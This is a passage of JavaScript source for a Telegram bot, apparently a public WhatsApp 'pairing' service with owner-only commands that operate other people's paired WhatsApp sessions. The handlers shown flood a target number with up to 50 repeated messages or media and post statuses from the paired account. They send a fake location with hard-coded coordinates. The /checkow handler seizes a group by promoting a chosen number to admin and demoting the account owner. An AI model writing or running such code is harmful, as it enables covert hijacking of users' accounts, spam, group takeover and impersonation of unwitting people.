📝 Now send your message (text, image, video, voice, doc, audio):`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ═══════ SENDSMS: Message Content ═══════
    if (state.step === 'send_message') {
        state.messageContent = text;
        state.step = 'send_quantity';
        await bot.sendMessage(chatId,
            `🛡️ *Send Message*

📱 To: ${state.targetNumber}
💬 Message: ${text.substring(0, 50)}${text.length > 50 ? '...' : ''}

🔢 How many times to send? (1-50):`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ═══════ SENDSMS: Quantity & Send ═══════
    if (state.step === 'send_quantity') {
        const qty = parseInt(text);
        if (isNaN(qty) || qty < 1 || qty > 50) {
            await bot.sendMessage(chatId, '❌ Enter number between 1-50.');
            return;
        }

        const sock = await getActiveSocket(state.sourceNumber + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Source socket not active.');
            ownerStates.delete(userId);
            return;
        }

        const targetJid = state.targetNumber + '@s.whatsapp.net';

        await bot.sendMessage(chatId, `⏳ Sending ${qty} message(s)...`);

        let sent = 0;
        for (let i = 0; i < qty; i++) {
            try {
                await sock.sendMessage(targetJid, { text: state.messageContent });
                sent++;
                await sleep(500);
            } catch (e) {
                console.error('Send error:', e);
            }
        }

        await bot.sendMessage(chatId,
            `✅ *Message Sent*

📱 To: ${state.targetNumber}
💬 ${sent}/${qty} messages delivered.`,
            { parse_mode: 'Markdown' }
        );
        ownerStates.delete(userId);
        return;
    }

    // ═══════ CHECKOW: Group Target Number ═══════
    if (state.step === 'ow_group_target') {
        if (!/^\d{7,15}$/.test(text)) {
            await bot.sendMessage(chatId, '❌ Invalid number.');
            return;
        }

        const sock = await getActiveSocket(state.number + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Socket not active.');
            ownerStates.delete(userId);
            return;
        }

        const targetJid = text + '@s.whatsapp.net';

        await bot.sendMessage(chatId, `⏳ Processing group admin transfer...`);

        try {
            await sock.groupParticipantsUpdate(state.groupJid, [targetJid], 'add');
            await sleep(2000);
            await sock.groupParticipantsUpdate(state.groupJid, [targetJid], 'promote');
            await sleep(1000);
            const meJid = state.number + '@s.whatsapp.net';
            await sock.groupParticipantsUpdate(state.groupJid, [meJid], 'demote');

            await bot.sendMessage(chatId,
                `✅ *Group Admin Transferred*

👥 Group: ${state.groupJid}
👤 New Admin: ${text}`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.error('Group transfer error:', e);
            await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
        }
        ownerStates.delete(userId);
        return;
    }

    // ═══════ CHECKOW: Channel JID Input ═══════
    if (state.step === 'ow_channel_jid') {
        state.channelJid = text;
        state.step = 'ow_channel_target';
        await bot.sendMessage(chatId,
            `🛡️ *Channel Transfer*

📰 Channel: ${text}

📝 Send target number for admin invite:`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ═══════ CHECKOW: Channel Target & Invite ═══════
    if (state.step === 'ow_channel_target') {
        if (!/^\d{7,15}$/.test(text)) {
            await bot.sendMessage(chatId, '❌ Invalid number.');
            return;
        }

        const sock = await getActiveSocket(state.number + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Socket not active.');
            ownerStates.delete(userId);
            return;
        }

        await bot.sendMessage(chatId,
            `⏳ Sending admin invite to ${text}...

` +
            `⚠️ Channel operations require WhatsApp Business API.
` +
            `Manual steps may be needed.`,
            { parse_mode: 'Markdown' }
        );

        ownerStates.delete(userId);
        return;
    }

    // ═══════ ADDSTATUS: Text Content ═══════
    if (state.step === 'status_content') {
        const sock = await getActiveSocket(state.sourceNumber + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Socket not active.');
            ownerStates.delete(userId);
            return;
        }

        await bot.sendMessage(chatId, `⏳ Posting status...`);

        try {
            if (state.statusType === 'text') {
                await sock.sendMessage('status@broadcast', { text: text });
            }

            await bot.sendMessage(chatId,
                `✅ *Status Posted*

📱 ${state.sourceNumber}
📝 Status updated.`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.error('Status error:', e);
            await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
        }
        ownerStates.delete(userId);
        return;
    }

    // ═══════ SENDLO: Target Number ═══════
    if (state.step === 'lo_target') {
        if (!/^\d{7,15}$/.test(text)) {
            await bot.sendMessage(chatId, '❌ Invalid number.');
            return;
        }

        const sock = await getActiveSocket(state.sourceNumber + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Socket not active.');
            ownerStates.delete(userId);
            return;
        }

        const targetJid = text + '@s.whatsapp.net';

        await bot.sendMessage(chatId, `⏳ Sending live location...`);

        try {
            await sock.sendMessage(targetJid, {
                location: {
                    degreesLatitude: 24.8607,
                    degreesLongitude: 67.0011
                }
            });

            await bot.sendMessage(chatId,
                `✅ *Live Location Sent*

📱 From: ${state.sourceNumber}
📍 To: ${text}`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.error('Location error:', e);
            await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
        }
        ownerStates.delete(userId);
        return;
    }
}

// ═══════════════════════════════════════════════════════════════
// ═══════════════ MEDIA HANDLER FOR STATUS/SEND ════════════════
// ═══════════════════════════════════════════════════════════════

bot.on('message', async (msg) => {
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const state = ownerStates.get(userId);

    if (!state || !isOwner(userId)) return;
    if (msg.chat.type !== 'private') return;
    if (msg.text && msg.text.startsWith('/')) return;

    // Handle media for status posting
    if (state.step === 'status_content') {
        const sock = await getActiveSocket(state.sourceNumber + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Socket not active.');
            ownerStates.delete(userId);
            return;
        }

        try {
            if (msg.photo && state.statusType === 'image') {
                const photo = msg.photo[msg.photo.length - 1];
                const file = await bot.getFile(photo.file_id);
                const imageUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage('status@broadcast', {
                    image: { url: imageUrl },
                    caption: msg.caption || ''
                });

                await bot.sendMessage(chatId, '✅ Image status posted!');
            }
            else if (msg.video && state.statusType === 'video') {
                const file = await bot.getFile(msg.video.file_id);
                const videoUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage('status@broadcast', {
                    video: { url: videoUrl },
                    caption: msg.caption || ''
                });

                await bot.sendMessage(chatId, '✅ Video status posted!');
            }
            else if (msg.voice && state.statusType === 'voice') {
                const file = await bot.getFile(msg.voice.file_id);
                const voiceUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage('status@broadcast', {
                    audio: { url: voiceUrl },
                    ptt: true
                });

                await bot.sendMessage(chatId, '✅ Voice status posted!');
            }
            else {
                await bot.sendMessage(chatId, '❌ Send correct media type.');
                return;
            }
        } catch (e) {
            console.error('Status media error:', e);
            await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
        }
        ownerStates.delete(userId);
        return;
    }

    // Handle media for send message
    if (state.step === 'send_message') {
        const sock = await getActiveSocket(state.sourceNumber + '@s.whatsapp.net');
        if (!sock) {
            await bot.sendMessage(chatId, '❌ Socket not active.');
            ownerStates.delete(userId);
            return;
        }

        const targetJid = state.targetNumber + '@s.whatsapp.net';

        try {
            if (msg.photo) {
                const photo = msg.photo[msg.photo.length - 1];
                const file = await bot.getFile(photo.file_id);
                const imageUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage(targetJid, {
                    image: { url: imageUrl },
                    caption: msg.caption || ''
                });
                await bot.sendMessage(chatId, '✅ Image sent! How many times? (1-50)');
                state.mediaSent = true;
            }
            else if (msg.video) {
                const file = await bot.getFile(msg.video.file_id);
                const videoUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage(targetJid, {
                    video: { url: videoUrl },
                    caption: msg.caption || ''
                });
                await bot.sendMessage(chatId, '✅ Video sent! How many times? (1-50)');
                state.mediaSent = true;
            }
            else if (msg.voice) {
                const file = await bot.getFile(msg.voice.file_id);
                const voiceUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage(targetJid, {
                    audio: { url: voiceUrl },
                    ptt: true
                });
                await bot.sendMessage(chatId, '✅ Voice sent! How many times? (1-50)');
                state.mediaSent = true;
            }
            else if (msg.document) {
                const file = await bot.getFile(msg.document.file_id);
                const docUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage(targetJid, {
                    document: { url: docUrl },
                    fileName: msg.document.file_name || 'document',
                    caption: msg.caption || ''
                });
                await bot.sendMessage(chatId, '✅ Document sent! How many times? (1-50)');
                state.mediaSent = true;
            }
            else if (msg.audio) {
                const file = await bot.getFile(msg.audio.file_id);
                const audioUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

                await sock.sendMessage(targetJid, {
                    audio: { url: audioUrl }
                });
                await bot.sendMessage(chatId, '✅ Audio sent! How many times? (1-50)');
                state.mediaSent = true;
            }
            else {
                return;
            }

            state.step = 'send_quantity';
            state.messageContent = '[MEDIA]';
        } catch (e) {
            console.error('Send media error:', e);
            await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
            ownerStates.delete(userId);
        }
        return;
    }
});

// ========== POLLING ERROR HANDLER ==========
bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

// ========== BOT START ==========
(async () => {
  await loadAdminIDs();

  const restartCount = parseInt(process.env.RESTART_COUNT || 0);
  console.log(`RESTART #${restartCount + 1}`);
  process.env.RESTART_COUNT = String(restartCount + 1);

  console.log('🤖 Telegram Bot is running...');
  console.log('✅ Bot Username: @bot_hosting_v1_bot');
  console.log('✅ Features: /pair, /unpair, /start');
  console.log('🛡️ Owner Commands: /owner, /checksms, /checkcn, /checkow, /sendsms, /addstatus, /sendlo');
})();

// ========== PROCESS HANDLERS ==========
process.on("uncaughtException", (err) => {
  console.error('Uncaught Exception:', err);
});
process.on("unhandledRejection", (err) => {
  console.error('Unhandled Rejection:', err);
});
process.removeAllListeners("warning");
process.once('SIGINT', () => gracefulShutdown('SIGINT'));
process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('message', (msg) => {
  if (msg === 'shutdown') gracefulShutdown('PM2_SHUTDOWN');
});
